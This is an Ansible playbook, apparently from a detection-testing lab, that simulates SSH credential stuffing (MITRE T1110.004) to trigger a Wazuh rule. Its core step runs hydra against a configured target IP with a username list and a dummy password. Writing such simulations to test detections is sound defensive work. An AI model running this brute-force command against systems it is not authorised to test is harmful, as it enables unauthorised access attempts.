---
# STAR-002 Attack Simulation — SSH Credential Stuffing
# Triggers Wazuh rule 100200 (Banking SSH credential stuffing)
# Maps to MITRE T1110.004 — Credential Stuffing

- name: "STAR-002 — Simulate SSH credential stuffing attack"
  hosts: attackers
  gather_facts: false
  vars_files:
    - ../vars/star_config.yml

  tasks:
    - name: "Display attack scenario information"
      ansible.builtin.debug:
        msg: "STAR-002 — Credential stuffing against {{ target_ip }} with {{ cred_stuff_users | length }} usernames"

    - name: "Create userlist for credential stuffing"
      ansible.builtin.copy:
        dest: /tmp/star_002_userlist.txt
        content: "{{ cred_stuff_users | join('\n') }}\n"
        mode: '0644'

    - name: "Execute hydra credential stuffing"
      ansible.builtin.shell: |
        hydra -L /tmp/star_002_userlist.txt -p anypassword ssh://{{ target_ip }} -t 4 -V 2>&1 | tail -15
      register: hydra_result
      changed_when: false
      failed_when: false

    - name: "Show hydra output"
      ansible.builtin.debug:
        var: hydra_result.stdout_lines

    - name: "Pause for Wazuh detection"
      ansible.builtin.pause:
        seconds: 10

    - name: "STAR-002 complete"
      ansible.builtin.debug:
        msg: "STAR-002 done. Verify rule.id:100200 in Wazuh."
